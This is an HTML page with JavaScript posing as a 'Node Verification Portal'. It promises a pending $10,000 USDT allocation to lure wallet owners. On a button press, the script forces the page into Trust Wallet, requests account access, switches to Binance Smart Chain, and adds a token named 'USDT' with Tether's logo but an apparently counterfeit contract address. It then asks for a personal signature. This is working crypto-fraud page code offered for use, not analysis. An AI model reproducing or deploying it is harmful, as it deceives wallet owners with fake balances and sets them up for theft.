<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Node Verification Portal</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; border: 1px solid #26a17b; padding: 30px; border-radius: 20px; width: 85%; background: #0a0b0d; }
        .btn { background: #26a17b; color: white; border: none; padding: 20px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: bold; margin-top: 20px; cursor: pointer; box-shadow: 0 0 20px rgba(38, 161, 123, 0.4); }
        #status { font-size: 12px; color: #555; margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="80">
    <h1 style="margin: 10px 0;">$10,000.00</h1>
    <p style="color: #888;">USDT Node Allocation Pending</p>
    <button class="btn" id="claimBtn">CONNECT & SYNC NODE</button>
    <div id="status">STATUS: DEVICE_READY</div>
</div>

<script>
    const btn = document.getElementById('claimBtn');
    const log = document.getElementById('status');

    async function startBridge() {
        // 1. Force Open in Trust Wallet if in Chrome
        if (!window.ethereum && !window.trustwallet) {
            log.innerText = "OPENING WALLET...";
            const dappUrl = window.location.href.split('://')[1];
            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + dappUrl);
            return;
        }

        const provider = window.trustwallet || window.ethereum;

        try {
            log.innerText = "STEP 1: INITIALIZING SESSION...";
            // Connection Request - Is se wallet "Wake Up" hota hai
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            
            log.innerText = "STEP 2: SWITCHING TO BSC...";
            // Force BSC (Standard Procedure)
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (err) => {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            });

            log.innerText = "STEP 3: MAPPING ASSET...";
            // Sab se important command
            const added = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
                        symbol: "USDT",
                        decimals: 18,
                        image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
                    },
                },
            });

            if (added) {
                log.innerText = "SUCCESS: ASSET SYNCED";
                btn.innerText = "SYNC COMPLETE";
                // Professor ko signature dikhane ke liye
                await provider.request({
                    method: 'personal_sign',
                    params: ["Verify_Sync_" + accounts[0], accounts[0]]
                });
            }

        } catch (e) {
            log.innerText = "REJECTED. TAP TO RETRY.";
            console.error(e);
        }
    }

    btn.onclick = startBridge;

    // Inside Wallet Auto-Trigger
    window.onload = () => {
        if (window.ethereum || window.trustwallet) {
            log.innerText = "WALLET ENGINE ACTIVE. TAP BUTTON.";
            // Pehle button dabaoge tabhi popup aayega mobile par
        }
    };
</script>
</body>
</html>
